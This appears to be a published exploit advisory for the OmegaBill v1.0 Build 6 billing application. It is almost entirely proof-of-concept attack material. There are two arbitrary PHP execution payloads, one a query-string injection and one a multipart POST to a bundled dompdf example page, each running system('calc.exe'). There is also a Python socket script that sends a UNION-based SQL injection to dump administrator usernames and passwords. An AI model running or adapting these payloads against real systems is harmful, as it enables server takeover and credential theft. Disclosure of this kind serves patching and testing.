Software................OmegaBill v1.0 Build 6
Vulnerability...........Arbitrary PHP Execution
Download................http://sourceforge.net/projects/omegabill/
Release Date............2/11/2011
Tested On...............Windows Vista + XAMPP
------------------------------------------------------------------------
Author..................AutoSec Tools
Site....................http://www.autosectools.com/
------------------------------------------------------------------------
 
--PoC--
 
Vulnerability 1:
 
http://localhost/OmegaBill_v1.0_Build6/clients/download_invoice.php?invoiceid=<?php system("calc.exe"); ?>
 
 
Vulnerability 2:
 
POST http://localhost/OmegaBill_v1.0_Build6/plugins/dompdf/www/examples.php HTTP/1.1
Host: localhost
Connection: keep-alive
User-Agent: x
Content-Length: 93
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----x
Accept: text/html
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
 
------x
Content-Disposition: form-data; name="html"
 
<?php system("calc.exe"); ?>
------x--
 
SQL Injection:
 
# ------------------------------------------------------------------------
# Software................OmegaBill v1.0 Build 6
# Vulnerability...........Authentication Bypass/SQL Injection
# Download................http://sourceforge.net/projects/omegabill/
# Release Date............2/11/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# ------------------------------------------------------------------------
#
# --Description--
#
# An authentication bypass/SQL injection vulnerability in OmegaBill v1.0
# Build 6 can be exploited to retreive a list of usernames and passwords.
#
#
# --PoC--
import socket
 
host = &#039;localhost&#039;
path = &#039;/omegabill_v1.0_build6&#039;
 
port = 80
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)   
 
s.send(&#039;POST &#039; + path + &#039;/generate_report.php HTTP/1.1\r\n&#039;
       &#039;Host: localhost\r\n&#039;
       &#039;Connection: keep-alive\r\n&#039;
       &#039;User-Agent: x\r\n&#039;
       &#039;Content-Length: 239\r\n&#039;
       &#039;Cache-Control: max-age=0\r\n&#039;
       &#039;Origin: null\r\n&#039;
       &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
       &#039;Accept: text/html\r\n&#039;
       &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
       &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
       &#039;\r\n&#039;
       &#039;------x\r\n&#039;
       &#039;Content-Disposition: form-data; name="startdate"\r\n&#039;
       &#039;\r\n&#039;
       &#039;\&#039;OR 1 = 1 UNION ALL SELECT CONCAT(username,\&#039;:\&#039;,password),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM admins;#\r\n&#039;
       &#039;------x\r\n&#039;
       &#039;Content-Disposition: form-data; name="enddate"\r\n&#039;
       &#039;\r\n&#039;
       &#039;\r\n&#039;
       &#039;------x--\r\n&#039;
       &#039;\r\n&#039;)
 
print s.recv(8192)



